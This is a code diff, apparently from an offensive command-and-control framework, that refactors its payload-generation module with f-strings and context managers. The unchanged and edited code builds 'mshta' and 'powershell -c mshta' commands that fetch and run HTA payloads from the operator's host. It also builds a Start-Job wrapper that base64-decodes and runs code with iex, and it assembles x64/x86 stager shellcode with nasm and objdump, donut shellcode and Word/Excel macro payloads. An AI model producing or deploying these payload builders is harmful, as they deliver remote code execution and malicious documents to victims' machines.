@@ -5,17 +5,17 @@ from core.color import bcolors
 import base64
 def hta_paylods():
     if SSL==True:
-        print (bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
-        print ('mshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
+        print(f'{bcolors.OKBLUE}(LOW):{bcolors.ENDC}')
+        print(f'mshta https://{config.HOST}:{config.PORT}{config.hta_payload}')
         print ('powershell -c \"mshta https://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload))
         config.PAYLOADS.append('\nmshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
-        print('')
     else:
-        print(bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
-        print('mshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
+        print(f'{bcolors.OKBLUE}(LOW):{bcolors.ENDC}')
+        print(f'mshta http://{config.HOST}:{config.PORT}{config.hta_payload}')
         print('powershell -c \"mshta http://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload))
         config.PAYLOADS.append('\nmshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
-        print('')
+
+    print('')
 
 def pwsh_job():
     commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))}"
@@ -145,9 +145,8 @@ def cmd_shellcodex64():
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
 
-    out=open("payloads/cmd_shellcodex64.asm","w")
-    out.write(payload)
-    out.close()
+    with open("payloads/cmd_shellcodex64.asm","w") as out:
+        out.write(payload)
     try:
         compile = "nasm -f win64 payloads/cmd_shellcodex64.asm -o payloads/cmd_shellcodex64.bin"
         shellcode = """for i in $(objdump -d payloads/cmd_shellcodex64.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
@@ -170,9 +169,8 @@ def cmd_shellcodex86():
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
 
-    out=open("payloads/cmd_shellcodex86.asm","w")
-    out.write(payload)
-    out.close()
+    with open("payloads/cmd_shellcodex86.asm","w") as out:
+        out.write(payload)
     try:
         compile_nasm_command = "nasm -f win64 payloads/cmd_shellcodex86.asm -o payloads/cmd_shellcodex86.bin"
         extract_shellcode_command = """for i in $(objdump -d payloads/cmd_shellcodex86.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
@@ -192,9 +190,8 @@ def donut_shellcode():
     except:
         print("Make sure donut 0.9.2 installed : pip3 install 'donut-shellcode==0.9.2' ")
     b64=base64.b64encode(shellcode).decode("utf-8")
-    out=open("payloads/donut_shellcode.b64","w")
-    out.write(b64)
-    out.close()
+    with open("payloads/donut_shellcode.b64","w") as out:
+        out.write(b64)
     print("---+  Donut Shellcode ---+ !\n")
     print('donut shellcode written to payloads/donut_shellcode.b64 \n' )
 
@@ -208,9 +205,8 @@ def word_macro():
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}","http")
 
 
-    out=open("payloads/Word_macro.vba","w")
-    out.write(payload)
-    out.close()
+    with open("payloads/Word_macro.vba","w") as out:
+        out.write(payload)
     print("Word Macro Payload written to payloads/Word_macro.vba : \n================Word Macro===========\n"+payload)
     print("=====================================")
 
@@ -222,8 +218,7 @@ def excel_macro():
     else:
         payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}","http")
 
-    out=open("payloads/Excel_macro.vba","w")
-    out.write(payload)
-    out.close()
+    with open("payloads/Excel_macro.vba","w") as out:
+        out.write(payload)
     print("Excel Macro Payload written to payloads/Excel_macro.vba : \n================Excel Macro===========\n"+payload)
     print("=====================================")
